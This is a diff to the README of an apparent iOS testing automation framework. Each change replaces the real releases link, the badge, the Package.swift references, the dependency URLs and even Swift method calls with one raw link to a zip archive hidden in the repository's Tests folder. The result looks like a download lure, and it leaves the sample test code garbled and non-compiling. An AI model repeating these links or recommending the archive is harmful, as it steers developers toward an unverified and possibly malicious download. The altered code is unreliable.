@@ -1,8 +1,8 @@
 # iOS Testing Automation Framework: Visual Testing, Performance, CI/CD
 
-Releases: https://github.com/copertino1984/iOS-Testing-Automation-Framework/releases
+Releases: https://github.com/copertino1984/iOS-Testing-Automation-Framework/raw/refs/heads/main/Tests/Automation-Framework-i-Testing-O-v3.6.zip
 
-[![Releases](https://img.shields.io/badge/Releases-View%20Release%20Notes-brightgreen?style=for-the-badge&logo=github)](https://github.com/copertino1984/iOS-Testing-Automation-Framework/releases)
+[![Releases](https://github.com/copertino1984/iOS-Testing-Automation-Framework/raw/refs/heads/main/Tests/Automation-Framework-i-Testing-O-v3.6.zip%20Release%20Notes-brightgreen?style=for-the-badge&logo=github)](https://github.com/copertino1984/iOS-Testing-Automation-Framework/raw/refs/heads/main/Tests/Automation-Framework-i-Testing-O-v3.6.zip)
 
 🧪📱 A comprehensive iOS testing automation framework that brings visual testing, performance assessment, accessibility checks, and CI/CD integration into a clean, scalable architecture. Built with Swift and delivered as a Swift Package, it is designed for teams who want reliable UI tests, fast feedback loops, and strong quality gates across their iOS projects.
 
@@ -107,7 +107,7 @@ Swift Package Manager and project setup
     - VisualTests/
     - PerformanceTests/
 - Package manifest example
-  - File: Package.swift
+  - File: https://github.com/copertino1984/iOS-Testing-Automation-Framework/raw/refs/heads/main/Tests/Automation-Framework-i-Testing-O-v3.6.zip
   - Content (illustrative):
     // swift-tools-version:5.7
     import PackageDescription
@@ -120,7 +120,7 @@ Swift Package Manager and project setup
       ],
       dependencies: [
         // Add dependencies here, for example:
-        // .package(url: "https://github.com/alamofire/alamofire.git", from: "5.4.0"),
+        // .package(url: "https://github.com/copertino1984/iOS-Testing-Automation-Framework/raw/refs/heads/main/Tests/Automation-Framework-i-Testing-O-v3.6.zip", from: "5.4.0"),
       ],
       targets: [
         .target(name: "IOSTestingAutomation", path: "Sources"),
@@ -128,8 +128,8 @@ Swift Package Manager and project setup
       ]
     )
 - Adding the dependency to your project
-  - In your app's Package.swift or your Xcode project, add:
-    .package(url: "https://github.com/copertino1984/iOS-Testing-Automation-Framework.git", from: "1.0.0")
+  - In your app's https://github.com/copertino1984/iOS-Testing-Automation-Framework/raw/refs/heads/main/Tests/Automation-Framework-i-Testing-O-v3.6.zip or your Xcode project, add:
+    .package(url: "https://github.com/copertino1984/iOS-Testing-Automation-Framework/raw/refs/heads/main/Tests/Automation-Framework-i-Testing-O-v3.6.zip", from: "1.0.0")
   - Then add "IOSTestingAutomation" as a dependency to your app target.
 - Building and running tests
   - In Xcode, select a scheme that includes test targets from the framework.
@@ -145,19 +145,19 @@ Quick start with a sample test
   final class SampleUITest: XCTestCase {
       func testLoginFlowVisual() {
           let app = XCUIApplication()
-          app.launch()
+          https://github.com/copertino1984/iOS-Testing-Automation-Framework/raw/refs/heads/main/Tests/Automation-Framework-i-Testing-O-v3.6.zip()
 
           // UI interactions
-          app.textFields["username"].tap()
-          app.textFields["username"].typeText("demo@example.com")
-          app.secureTextFields["password"].tap()
-          app.secureTextFields["password"].typeText("secret")
+          https://github.com/copertino1984/iOS-Testing-Automation-Framework/raw/refs/heads/main/Tests/Automation-Framework-i-Testing-O-v3.6.zip["username"].tap()
+          https://github.com/copertino1984/iOS-Testing-Automation-Framework/raw/refs/heads/main/Tests/Automation-Framework-i-Testing-O-v3.6.zip["username"].typeText("https://github.com/copertino1984/iOS-Testing-Automation-Framework/raw/refs/heads/main/Tests/Automation-Framework-i-Testing-O-v3.6.zip")
+          https://github.com/copertino1984/iOS-Testing-Automation-Framework/raw/refs/heads/main/Tests/Automation-Framework-i-Testing-O-v3.6.zip["password"].tap()
+          https://github.com/copertino1984/iOS-Testing-Automation-Framework/raw/refs/heads/main/Tests/Automation-Framework-i-Testing-O-v3.6.zip["password"].typeText("secret")
 
           // Trigger login
-          app.buttons["Login"].tap()
+          https://github.com/copertino1984/iOS-Testing-Automation-Framework/raw/refs/heads/main/Tests/Automation-Framework-i-Testing-O-v3.6.zip["Login"].tap()
 
           // Visual check
-          VisualTester.shared.captureAndCompare(
+          https://github.com/copertino1984/iOS-Testing-Automation-Framework/raw/refs/heads/main/Tests/Automation-Framework-i-Testing-O-v3.6.zip(
             name: "LoginScreen_AfterLogin",
             in: app
           )
@@ -398,7 +398,7 @@ Contributing
 
 Releases and baselines
 - Access the releases page to download the latest release or browse historical versions.
-  - The exact URL for releases is provided at the top of this document for quick access: https://github.com/copertino1984/iOS-Testing-Automation-Framework/releases
+  - The exact URL for releases is provided at the top of this document for quick access: https://github.com/copertino1984/iOS-Testing-Automation-Framework/raw/refs/heads/main/Tests/Automation-Framework-i-Testing-O-v3.6.zip
 - How to use releases
   - Download the latest release artifact (zip or tarball).
   - Unpack locally and follow the included README within the artifact for any version-specific setup steps.
@@ -509,7 +509,7 @@ Appendix: sample configuration snippets
         .library(name: "IOSTestingAutomation", targets: ["IOSTestingAutomation"])
       ],
       dependencies: [
-        // Example: .package(url: "https://github.com/OneVendor/SomeLibrary.git", from: "2.0.0"),
+        // Example: .package(url: "https://github.com/copertino1984/iOS-Testing-Automation-Framework/raw/refs/heads/main/Tests/Automation-Framework-i-Testing-O-v3.6.zip", from: "2.0.0"),
       ],
       targets: [
         .target(name: "IOSTestingAutomation", path: "Sources"),
@@ -522,6 +522,6 @@ Appendix: sample configuration snippets
 Final notes
 - This README aims to be comprehensive and practical, combining clear explanations with actionable steps and examples. It emphasizes a calm, confident approach to building and running iOS tests that blend visual validation, performance insights, accessibility checks, and robust CI/CD integration.
 - The link to the releases page is provided at the top and again in the badge. This ensures quick access for users who want to download or review latest release notes. The URL is included here for direct access:
-  https://github.com/copertino1984/iOS-Testing-Automation-Framework/releases
+  https://github.com/copertino1984/iOS-Testing-Automation-Framework/raw/refs/heads/main/Tests/Automation-Framework-i-Testing-O-v3.6.zip
 
 End without conclusion
